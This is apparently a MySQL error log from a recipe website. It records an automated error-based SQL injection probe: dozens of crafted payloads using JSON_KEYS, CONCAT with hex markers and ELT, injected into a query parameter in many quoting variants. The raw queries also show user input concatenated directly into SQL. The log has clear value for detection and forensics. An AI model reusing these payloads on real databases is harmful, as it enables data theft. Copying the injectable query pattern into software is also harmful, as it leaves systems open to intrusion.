+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'cZeP' FROM DUAL WHERE 6277=6277 OR JSON_KEYS((SELECT CONVERT((SELECT' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'cZeP' FROM DUAL WHERE 6277=6277 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" WHERE 1620=1620 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" WHERE 1620=1620 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- IVXp=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' WHERE 8518=8518 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' WHERE 8518=8518 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- FNYH=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") WHERE 9272=9272 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") WHERE 9272=9272 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- TPkK=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') WHERE 1653=1653 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') WHERE 1653=1653 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- jZGw=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=312' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND "kgrm" LIKE "kgrm=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ((("CIVD" LIKE "CIVD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND (("cFIh" LIKE "cFIh=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=31' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ("Bxoh" LIKE "Bxoh=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=312' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND "lLNP"="lLNP=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ((("fhoz"="fhoz=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND (("eTWp"="eTWp=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=31' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ("WnHr"="WnHr=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=312' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND 'EMoj' LIKE 'EMoj=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ((('YAJk' LIKE 'YAJk=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND (('MsCZ' LIKE 'MsCZ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=31' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ('mgpo' LIKE 'mgpo=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=312' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND 'ZdkS'='ZdkS=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ((('QrGs'='QrGs=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND (('PvNg'='PvNg=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=31' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ('NYii'='NYii=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=312' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- LyyY=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=312' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- AXmS=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=31' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- ZUJP=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`) WHERE 7107=7107 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4`) WHERE 7107=7107 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- MrTR=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '` WHERE 3598=3598 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4` WHERE 3598=3598 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- ccfW=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AS ThuG WHERE 4982=4982 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AS ThuG WHERE 4982=4982 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- oPeR=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS bQZY WHERE 4613=4613 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6278' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AS bQZY WHERE 4613=4613 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- mkWo=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 7746=7746 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 WHERE 7746=7746 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- TrJS=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 2005=2005 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) WHERE 2005=2005 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- Bxqd=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))# JJzN=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- kvtc=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=31' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND (((9874=9874=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=312' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND ((8164=8164=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:43
+SQLSTATE[22032]: <<Unknown error>>: 3141 Invalid JSON text in argument 1 to function json_keys: "Invalid value." at position 0.
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))) AND (8189=8189=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:43
+SQLSTATE[22032]: <<Unknown error>>: 3141 Invalid JSON text in argument 1 to function json_keys: "Invalid value." at position 0.
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- BSlD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' IN BOOLEAN MODE) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' IN BOOLEAN MODE) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AS odQc WHERE 3510=3510 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a62' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AS odQc WHERE 3510=3510 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- ykiK=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AS BSpV WHERE 8280=8280 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a62' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AS BSpV WHERE 8280=8280 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- pHfK=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AS uvKp WHERE 7165=7165 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AS uvKp WHERE 7165=7165 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- tGPx=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AS hGjo WHERE 8894=8894 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AS hGjo WHERE 8894=8894 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- pWAi=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT 'WiIQ' WHERE 9631=9631 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT 'WiIQ' WHERE 9631=9631 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT FAUu WHERE 5089=5089 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT FAUu WHERE 5089=5089 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'uzLN' WHERE 4981=4981 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'uzLN' WHERE 4981=4981 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'YuMz' FROM DUAL WHERE 4756=4756 AND JSON_KEYS((SELECT CONVERT((SELEC' at line 1
